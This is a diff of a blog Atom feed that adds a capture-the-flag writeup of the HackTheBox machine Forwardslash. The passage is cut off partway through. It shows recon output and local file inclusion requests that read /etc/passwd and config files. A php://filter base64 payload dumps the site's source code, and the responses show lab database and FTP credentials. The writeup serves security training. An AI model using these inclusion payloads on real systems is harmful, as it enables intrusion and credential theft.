@@ -1,5 +1,583 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-06-21T09:15:00+02:00</updated><entry><title>HTB: ServMon</title><link href="https://maggick.fr/2020/06/htb-servmon.html" rel="alternate"></link><published>2020-06-21T09:15:00+02:00</published><updated>2020-06-21T09:15:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-06-21:/2020/06/htb-servmon.html</id><summary type="html">&lt;p&gt;&lt;img alt="ServMon Card" class="align-left" src="/media/2020.06/servmon_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-07T09:09:00+02:00</updated><entry><title>HTB: Forwardslash</title><link href="https://maggick.fr/2020/07/htb-forwardslash.html" rel="alternate"></link><published>2020-07-07T09:09:00+02:00</published><updated>2020-07-07T09:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-07:/2020/07/htb-forwardslash.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forwardslash card" class="align-left" src="/media/2020.07/forwardslash_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/239"&gt;Forwardslash&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/44614"&gt;chivato&lt;/a&gt; publish on
+April 4, 2020.
+This box is classified as an hard machine. The user part inplies some
+enumeration a LFI, some PHP filter, a home made backup binary. The root part
+implies some home made crypto (&lt;strong&gt;don't&lt;/strong&gt;) and a LUKS image.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/forwardslash_card.png" alt="Forwardslash card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/239"&gt;Forwardslash&lt;/a&gt; created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/52045"&gt;InfoSecJack&lt;/a&gt; and
+&lt;a href="https://www.hackthebox.eu/home/users/profile/44614"&gt;chivato&lt;/a&gt; publish on
+April 4, 2020.
+This box is classified as an hard machine. The user part inplies some
+enumeration a LFI, some PHP filter, a home made backup binary. The root part
+implies some home made crypto (&lt;strong&gt;don't&lt;/strong&gt;) and a LUKS image.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Apr 25 07:56:08 2020 as: nmap -p- -oN nmap 10.10.10.183&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.183&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sun Apr 25 07:56:20 2020 -- 1 IP address (1 host up) scanned in 12.27 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The homepage announce that the site was hacked.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="homepage" src="/media/2020.07/forwardslash_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We don't have access to anything. We start with a simple fuzzing using &lt;code&gt;ffuf&lt;/code&gt;
+but nothing interesting came out. We had the extension &lt;code&gt;.xml&lt;/code&gt;, &lt;code&gt;.txt&lt;/code&gt; and &lt;code&gt;.php&lt;/code&gt;
+to &lt;code&gt;ffuf&lt;/code&gt; and relaunch it. This time we found an "interesting" page: &lt;code&gt;note.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ./ffuf -w /usr/share/wordlists/dirb/big.txt -u http://forwardslash.htb/FUZZ -mc 200 -c -e .xml,.txt,.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\&lt;/span&gt;
+&lt;span class="code-line"&gt;      /\ \__/ /\ \__/  __  __  /\ \__/&lt;/span&gt;
+&lt;span class="code-line"&gt;      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&lt;/span&gt;
+&lt;span class="code-line"&gt;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&lt;/span&gt;
+&lt;span class="code-line"&gt;        \ \_\   \ \_\  \ \____/  \ \_\&lt;/span&gt;
+&lt;span class="code-line"&gt;          \/_/    \/_/   \/___/    \/_/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      v1.0.2&lt;/span&gt;
+&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Method           : GET&lt;/span&gt;
+&lt;span class="code-line"&gt;:: URL              : http://forwardslash.htb/FUZZ&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Extensions       : .xml .txt .php&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Follow redirects : false&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Calibration      : false&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Timeout          : 10&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Threads          : 40&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Matcher          : Response status: 200&lt;/span&gt;
+&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;index.php               [Status: 200, Size: 1695, Words: 207, Lines: 42]&lt;/span&gt;
+&lt;span class="code-line"&gt;note.txt                [Status: 200, Size: 216, Words: 39, Lines: 5]&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Progress: [81876/81876] :: Job [1/1] :: 481 req/sec :: Duration: [0:02:50] :: Errors: 67 ::&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The note contain a message from the website administrator &lt;code&gt;chiv&lt;/code&gt; speaking about
+a backup site.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name...  Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.&lt;/p&gt;
+&lt;p&gt;-chiv&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We modify our &lt;code&gt;/etc/hosts&lt;/code&gt; in order to add the &lt;code&gt;backup&lt;/code&gt; subdomain and browse to
+&lt;code&gt;http://backup.forwardslash.htb/&lt;/code&gt; which is an authentication form.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="backup homepage" src="/media/2020.07/forwardslash_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;We are able to auto register here and access an few functionality. One was
+disabled because of the hack: The profile picture upload. But the button are just
+disables in the HTML source code. We can easily re-enable them with the element
+inspector (browser built-in).&lt;/p&gt;
+&lt;p&gt;We can then upload our profile picture with a POST request. Nevertheless we can
+also modify the URL to include local files as &lt;code&gt;/etc/passwd&lt;/code&gt; by simply putting a
+relative path.&lt;/p&gt;
+&lt;p&gt;Here is the request:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 32&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;url=../../../../../../etc/passwd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the server's response:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
+&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
+&lt;span class="code-line"&gt;pain:x:1000:1000:pain:/home/pain:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now that we have a LFI we can look for the database credentials. We load the
+&lt;code&gt;register.php&lt;/code&gt; file as it is certainly using the database to store the new
+users. We see that the file only include the &lt;code&gt;config.php&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;Here is the request:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 18&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;url=./register.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the server's answer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;// Include config file&lt;/span&gt;
+&lt;span class="code-line"&gt;require_once &amp;quot;config.php&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;// Define variables and initialize with empty values&lt;/span&gt;
+&lt;span class="code-line"&gt;$username = $password = $confirm_password = &amp;quot;&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;$username_err = $password_err = $confirm_password_err = &amp;quot;&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;// Processing form data when form is submitted&lt;/span&gt;
+&lt;span class="code-line"&gt;if($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;){&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Therefore we load the &lt;code&gt;config.php&lt;/code&gt; file. It contains the current DB credentials
+but we cannot use them for anything else (mostly connect using the SSH service).
+The comment speaks about a backup of the old configuration.&lt;/p&gt;
+&lt;p&gt;Here is the request:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 16&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;url=./config.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the server's answer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;//credentials for the temp db while we recover, had to backup old config, didn&amp;#39;t want it getting compromised -pain&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_SERVER&amp;#39;, &amp;#39;localhost&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_USERNAME&amp;#39;, &amp;#39;www-data&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_PASSWORD&amp;#39;, &amp;#39;5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;define(&amp;#39;DB_NAME&amp;#39;, &amp;#39;site&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/* Attempt to connect to MySQL database */&lt;/span&gt;
+&lt;span class="code-line"&gt;$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;// Check connection&lt;/span&gt;
+&lt;span class="code-line"&gt;if($link === false){&lt;/span&gt;
+&lt;span class="code-line"&gt;    die(&amp;quot;ERROR: Could not connect. &amp;quot; . mysqli_connect_error());&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We start enumeration the website and quickly found the &lt;code&gt;/dev/&lt;/code&gt; folder. He is not
+accessible from our IP address as there must be some network filtering.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="dev access denied" src="/media/2020.07/forwardslash_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;We try to include the file with our previous LFI but we got an error saying "Permission Denied; not that way ;)"&lt;/p&gt;
+&lt;p&gt;Here is the request:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 17&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;url=dev/index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then try to use the PHP filters to access the file content. The base64 filter
+give us the content of the file base64 encoded.&lt;/p&gt;
+&lt;p&gt;Here is the request:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /profilepicture.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: backup.forwardslash.htb&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 61&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=7j90s0qj5ssk9keddt94ttgcoq&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;url=php://filter/convert.base64-encode/resource=dev/index.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the server's answer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We decode the base64 content to get the old database credentials.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;reg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_GET&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;&amp;#39;xml&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="k"&gt;match&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;explode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="k"&gt;match&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="n"&gt;error_log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;Connecting&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
